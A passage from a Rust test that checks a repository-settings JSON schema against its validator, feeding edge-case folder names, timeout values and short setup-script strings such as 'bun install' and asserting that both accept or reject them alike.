        "a//b", ".", "./a", "a/.", "a/..", "../a", "..", "a\\b", "a*", "a?", "a\nb", "a\tb", "a\u{7f}", "a\u{85}", long_folder.as_str()] {
        let by_schema = sample.chars().count() <= folder_max && folder_pattern.is_match(sample);
        assert_eq!(by_schema, valid("sparseCheckout", &json!([sample]), Layer::RepositoryShared), "{sample:?}");
    }
    assert_eq!((folders["maxItems"].as_u64(), &folders["uniqueItems"]), (Some(SPARSE_CHECKOUT_MAX_FOLDERS as u64), &json!(true)));
    let timeouts = schema["properties"][ARCHIVE_TIMEOUT]["enum"].as_array().unwrap();
    for minutes in 0..=60u64 {
        assert_eq!(timeouts.contains(&json!(minutes)), valid(ARCHIVE_TIMEOUT, &json!(minutes), Layer::RepositoryShared), "{minutes}");
    }
    for key in [SETUP_SCRIPT, ARCHIVE_SCRIPT] {
        let script = &schema["properties"][key];
        let pattern = regex::Regex::new(script["pattern"].as_str().unwrap()).unwrap();
        for sample in ["", "bun install", "a\u{0}b"] {
            assert_eq!(pattern.is_match(sample), valid(key, &json!(sample), Layer::RepositoryShared), "{key} {sample:?}");
        }
        assert_eq!(script["maxLength"].as_u64(), Some(SCRIPT_LIMIT as u64));
    }
    // Schema properties are sorted; the registry is in declaration order.
    let keys: Vec<&String> = schema["properties"].as_object().unwrap().keys().filter(|key| *key != "$schema").collect();
    let mut registered = REGISTRY.iter().filter(|key| key.repository_configurable).map(|key| key.key).collect::<Vec<_>>();
    registered.sort_unstable();
    assert_eq!(keys, registered);
    assert_eq!(schema["additionalProperties"], false);
}
